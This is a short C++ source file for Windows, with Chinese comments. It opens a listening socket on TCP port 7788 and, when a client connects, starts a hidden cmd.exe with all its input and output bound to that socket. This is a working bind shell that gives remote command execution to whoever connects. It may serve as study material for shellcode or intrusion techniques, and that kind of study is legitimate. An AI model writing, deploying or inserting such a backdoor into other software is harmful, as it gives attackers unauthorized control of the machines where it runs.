#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <WinSock2.h>
#include <Windows.h>
#include <iostream>

#pragma comment(lib, "ws2_32.lib")

int main()
{

	// 初始化网络环境
	WSADATA wsaData;
	int result = WSAStartup(0x0202, &wsaData); // e0 8c f7 76
	SOCKET socket = INVALID_SOCKET;
	socket = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
	SOCKADDR_IN serverAddr;
	serverAddr.sin_family = AF_INET;
	serverAddr.sin_port = htons(7788);   // 计算机是小端序，网络是大端序，htons作用是将小端改未大端
	serverAddr.sin_addr.S_un.S_addr = INADDR_ANY;
	bind(socket, (LPSOCKADDR)&serverAddr, sizeof(SOCKADDR_IN));
	listen(socket, 0x7FFFFFFF);
	socket = accept(socket, 0, 0);
	PROCESS_INFORMATION pinfo{};
	STARTUPINFOA sinfo{};
	sinfo.cb = sizeof(STARTUPINFOA);
	sinfo.dwFlags = STARTF_USESTDHANDLES;
	sinfo.wShowWindow = SW_HIDE;
	sinfo.hStdInput = (HANDLE)socket;
	sinfo.hStdOutput = (HANDLE)socket;
	sinfo.hStdError = (HANDLE)socket;

	BOOL isSuccess = CreateProcessA(0, (LPSTR)"cmd.exe", 0, 0, TRUE, 0, 0, 0, &sinfo, &pinfo);

	// 关闭句柄释放资源
	CloseHandle(pinfo.hProcess);
	CloseHandle(pinfo.hThread);
	closesocket(socket);
	WSACleanup();



	return 0;
}